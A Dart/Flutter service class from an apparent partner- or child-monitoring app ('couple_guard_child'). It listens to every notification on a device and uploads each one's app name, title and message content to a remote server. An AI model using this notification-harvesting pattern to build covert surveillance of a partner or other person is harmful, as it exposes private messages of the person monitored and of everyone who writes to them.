import 'package:get/get.dart';
import 'package:notification_listener_service/notification_event.dart';
import 'package:notification_listener_service/notification_listener_service.dart';
import '../../core/constants/app_endpoints.dart';
import '../api/api_service.dart';
import '../local/local_storage_service.dart';

class NotificationService {
  static bool _isListening = false;

  static Future<void> startListening() async {
    if (_isListening) return;

    // Check permission
    bool hasPermission =
        await NotificationListenerService.isPermissionGranted();
    if (!hasPermission) {
      await NotificationListenerService.requestPermission();
      return;
    }

    _isListening = true;

    // Start listening
    NotificationListenerService.notificationsStream.listen((event) async {
      if (event.packageName == 'com.example.couple_guard_child') return;

      await _sendNotification(event);
    });
  }

  static Future<void> _sendNotification(ServiceNotificationEvent event) async {
    try {
      final deviceId = await LocalStorageService.getDeviceId();
      if (deviceId == null) return;

      // Get ApiService lazily
      final apiService = Get.find<ApiService>();

      await apiService.post(
        ApiEndpoints.sendNotification,
        data: {
          'device_id': deviceId,
          'app_name': event.packageName ?? 'Unknown',
          'title': event.title ?? '',
          'content': event.content ?? '',
          'timestamp': DateTime.now().toIso8601String(),
        },
      );
    } catch (e) {
      print('Failed to send notification: $e');
    }
  }

  static void stopListening() {
    _isListening = false;
  }
}
